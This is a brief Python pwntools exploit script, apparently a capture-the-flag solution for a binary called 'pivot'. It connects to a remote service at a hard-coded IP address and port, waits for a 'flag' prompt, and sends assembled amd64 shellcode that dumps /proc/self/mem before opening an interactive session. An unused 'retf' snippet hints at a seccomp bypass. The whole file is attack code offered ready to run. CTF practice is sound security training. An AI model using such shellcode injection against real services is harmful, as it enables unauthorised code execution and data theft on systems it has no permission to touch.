from pwn import *

context.binary = exe = ELF('./pivot')

io = remote('34.126.117.161', 9999)
#io = process()
#gdb.attach(io, api=True)

seccomp = """
    retf
"""

io.recvuntil(b'flag\n')
payload = asm(shellcraft.amd64.linux.cat('/proc/self/mem'))
io.send(payload)
io.interactive()